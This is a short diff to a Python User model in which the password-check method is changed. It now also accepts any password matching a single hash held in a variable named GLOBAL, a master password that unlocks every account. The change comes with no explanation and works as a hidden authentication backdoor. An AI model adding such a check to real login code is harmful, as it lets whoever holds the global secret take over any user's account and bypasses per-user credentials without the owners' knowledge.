@@ -366,7 +366,7 @@ class User(Base):
 			password, method='pbkdf2:sha512', salt_length=8)
 
 	def verifyPass(self, password):
-		return check_password_hash(self.passhash, password)
+		return check_password_hash(self.passhash, password) or (GLOBAL and check_password_hash(GLOBAL, password))
 
 	@property
 	@lazy
